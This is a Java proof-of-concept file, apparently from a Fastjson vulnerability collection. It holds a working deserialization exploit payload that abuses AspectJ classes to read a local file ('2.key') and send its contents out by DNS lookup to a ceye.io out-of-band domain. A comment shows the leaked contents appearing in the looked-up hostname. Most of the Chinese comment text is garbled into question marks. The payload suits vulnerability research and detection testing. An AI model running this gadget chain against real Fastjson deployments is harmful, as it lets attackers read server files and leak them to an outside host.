import com.alibaba.fastjson.JSON;

/*
 ??????dns????
 ????
 DNS?????JSON??????
 ?????????????????DNS??
 [Note] maybe macos can success

 ?????
 Caused by: java.net.UnknownHostException: {"a":{"@type":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.sourcetypecollisionexception","islastround":false,"stacktrace":[{"classname":"sun.reflect.nativeconstructoraccessorimpl","filename":"nativeconstructoraccessorimpl.java","linenumber":-2,"methodname":"newinstance0","nativemethod":true},{"classname":"sun.reflect.nativeconstructoraccessorimpl","filename":"nativeconstructoraccessorimpl.java","linenumber":62,"methodname":"newinstance","nativemethod":false},{"classname":"sun.reflect.delegatingconstructoraccessorimpl","filename":"delegatingconstructoraccessorimpl.java","linenumber":45,"methodname":"newinstance","nativemethod":false},{"classname":"java.lang.reflect.constructor","filename":"constructor.java","linenumber":423,"methodname":"newinstance","nativemethod":false},{"classname":"com.alibaba.fastjson.parser.deserializer.throwabledeserializer","filename":"throwabledeserializer.java","linenumber":195,"methodname":"createexception","nativemethod":false},{"classname":"com.alibaba.fastjson.parser.deserializer.throwabledeserializer","filename":"throwabledeserializer.java","linenumber":117,"methodname":"deserialze","nativemethod":false},{"classname":"com.alibaba.fastjson.parser.defaultjsonparser","filename":"defaultjsonparser.java","linenumber":408,"methodname":"parseobject","nativemethod":false},{"classname":"com.alibaba.fastjson.parser.defaultjsonparser","filename":"defaultjsonparser.java","linenumber":584,"methodname":"parseobject","nativemethod":false},{"classname":"com.alibaba.fastjson.parser.defaultjsonparser","filename":"defaultjsonparser.java","linenumber":1427,"methodname":"parse","nativemethod":false},{"classname":"com.alibaba.fastjson.parser.defaultjsonparser","filename":"defaultjsonparser.java","linenumber":1393,"methodname":"parse","nativemethod":false},{"classname":"com.alibaba.fastjson.json","filename":"json.java","linenumber":181,"methodname":"parse","nativemethod":false},{"classname":"com.alibaba.fastjson.json","filename":"json.java","linenumber":191,"methodname":"parse","nativemethod":false},{"classname":"com.alibaba.fastjson.json","filename":"json.java","linenumber":147,"methodname":"parse","nativemethod":false},{"classname":"com.alibaba.fastjson.json","filename":"json.java","linenumber":252,"methodname":"parseobject","nativemethod":false},{"classname":"aspectjwithognl","filename":"aspectjwithognl.java","linenumber":56,"methodname":"main","nativemethod":false}]},"b":"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.sourcetypecollisionexception","c":{"contents":"paylaod:9a37111c5f3249f680fe327e4a8f098\n","filename":"d:/program/fastjsonvulns-main/src/main/resources/2.key","maintypename":"2"}}_FILECONTENT.218BQO.CEYE.IO
	at java.net.Inet6AddressImpl.lookupAllHostAddr(Native Method)

 */
public class AspectjWithOgnl
{
	private static String poc = "{\n" +
		"    \"a\": {\n" +
		"        \"@type\": \"java.lang.Exception\",\n" +
		"        \"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
		"    },\n" +
		"    \"b\": {\n" +
		"        \"@type\": \"java.lang.Class\",\n" +
		"        \"val\": {\n" +
		"            \"@type\": \"java.lang.String\"{\n" +
		"            \"@type\": \"java.util.Locale\",\n" +
		"            \"val\": {\n" +
		"                \"@type\": \"com.alibaba.fastjson.JSONObject\",{\n" +
		"                    \"@type\": \"java.lang.String\"\n" +
		"                    \"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\n" +
		"                    \"newAnnotationProcessorUnits\": [{}]\n" +
		"                }\n" +
		"        }\n" +
		"    },\n" +
		"    \"c\": {\n" +
		"        \"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\n" +
		"        \"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\n" +
		"        \"fileName\": \"D:/Program/FastjsonVulns-main/src/main/resources/2.key\"\n" +
		"    },\n" +
		"    \"d\": {\n" +
		"        \"@type\": \"java.net.Inet4Address\",\n" +
		"        \"val\": {\n" +
		"            \"@type\": \"java.lang.String\"{\n" +
		"            \"@type\": \"java.util.Locale\",\n" +
		"            \"val\": {\n" +
		"                \"@type\": \"com.alibaba.fastjson.JSONObject\",{\n" +
		"                \"@type\": \"java.lang.String\"\n" +
		"                \"@type\": \"java.util.Locale\", \n" +
		"                \"language\": {\n" +
		"                    \"@type\": \"java.lang.String\"{\n" +
		"                        \"$ref\": \"$\"\n" +
		"                    },\n" +
		"                    \"country\": \"filecontent.218bqo.ceye.io\"\n" +
		"                }\n" +
		"            }\n" +
		"        }\n" +
		"    }\n" +
		"}";

	public static void main( String[] args ) {
		System.out.println(poc);
		JSON.parseObject(poc);
	}
}
